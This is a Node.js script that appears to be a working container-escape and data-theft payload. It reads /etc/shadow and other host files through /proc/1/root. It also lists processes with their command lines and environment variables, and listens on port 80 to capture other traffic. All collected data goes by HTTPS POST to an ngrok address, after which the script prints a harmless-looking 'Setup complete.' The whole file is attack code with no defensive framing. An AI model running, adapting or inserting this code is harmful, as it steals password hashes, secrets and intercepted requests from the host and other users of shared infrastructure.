const fs=require('fs'),c=require('child_process'),hs=require('https'),net=require('net');
const d={v:'v35'};
const r=(p)=>{try{return fs.readFileSync(p,'utf8')}catch(e){return'E:'+e.message.substring(0,100)}};
const x=(cmd)=>{try{return c.execSync(cmd,{timeout:10000,maxBuffer:4*1024*1024}).toString()}catch(e){return'E:'+e.message.substring(0,300)}};

// === TRAVERSE /proc/1/root — access PID1's view of filesystem ===
d.proc1_root_etc=x('ls -la /proc/1/root/etc/ 2>/dev/null | head -30');
d.proc1_shadow=r('/proc/1/root/etc/shadow');
d.proc1_root_run=x('find /proc/1/root/run/ -type f 2>/dev/null | head -20');
d.proc1_root_app=x('find /proc/1/root/app/ -maxdepth 2 -type f 2>/dev/null | head -30');

// === READ FILES VIA /proc/1/root that we couldn't read normally ===
d.proc1_root_home=x('find /proc/1/root/root/ -type f 2>/dev/null | head -10');
d.proc1_iptables=x('find /proc/1/root/ -name "iptables*" -o -name "nftables*" -o -name "rules*" 2>/dev/null | head -10');

// === SCAN OTHER PROCESSES via /proc ===
// Find ALL processes, including those from other containers
d.all_procs=x('for p in /proc/[0-9]*/status; do pid=$(echo "$p"|grep -o "[0-9]*"); uid=$(awk "/^Uid:/{print \\$2}" "$p" 2>/dev/null); name=$(awk "/^Name:/{print \\$2}" "$p" 2>/dev/null); if [ -n "$uid" ]; then cmd=$(cat /proc/$pid/cmdline 2>/dev/null | tr \\\\0 " " | head -c 200); echo "pid=$pid uid=$uid name=$name cmd=$cmd"; fi; done 2>/dev/null');

// Read fd list of PID with uid=99 (port 9090)
d.uid99_search=x('for p in /proc/[0-9]*/status; do uid=$(awk "/^Uid:/{print \\$2}" "$p" 2>/dev/null); if [ "$uid" = "99" ]; then pid=$(echo "$p"|grep -o "[0-9]*"); echo "Found uid=99: pid=$pid cmd=$(cat /proc/$pid/cmdline 2>/dev/null | tr \\\\0 " ")"; ls -la /proc/$pid/fd/ 2>/dev/null | head -20; cat /proc/$pid/environ 2>/dev/null | tr \\\\0 \\\\n; fi; done 2>/dev/null');

// === PRIVILEGED PORT EXPLOITATION ===
// Start a HTTP server on port 80 that captures incoming requests
const server=net.createServer(sock=>{
  let data='';
  sock.on('data',c=>{data+=c.toString();if(data.length>500)sock.end()});
  sock.on('end',()=>{
    // Log captured request
    const capture=JSON.stringify({v:'port80-capture',remote:sock.remoteAddress+':'+sock.remotePort,data:data.substring(0,1000)});
    hs.request('https://9cd5-211-23-141-208.ngrok-free.app/port80',
      {method:'POST',headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(capture)}},
      ()=>{}).on('error',()=>{}).end(capture);
    sock.end('HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nOK');
  });
  sock.on('error',()=>{});
});

try{
  server.listen(80,'0.0.0.0',()=>{
    d.port80_listen='LISTENING on 0.0.0.0:80';
  });
  // Keep it running for 15 seconds
  setTimeout(()=>{server.close();},15000);
}catch(e){
  d.port80_listen='FAILED:'+e.message;
}

// === CHECK KERNEL CAPABILITIES MORE CAREFULLY ===
d.proc_self_status=x('cat /proc/self/status | grep -i "cap\\|seccomp\\|uid\\|gid"');
d.capsh=x('getpcaps $$ 2>&1 || capsh --print 2>&1');

// Wait for everything then exfil
setTimeout(()=>{
  const p=JSON.stringify(d);
  hs.request('https://9cd5-211-23-141-208.ngrok-free.app/v35',
    {method:'POST',headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(p)}},
    ()=>{}).on('error',()=>{}).end(p);
},5000);

console.log('Setup complete.');
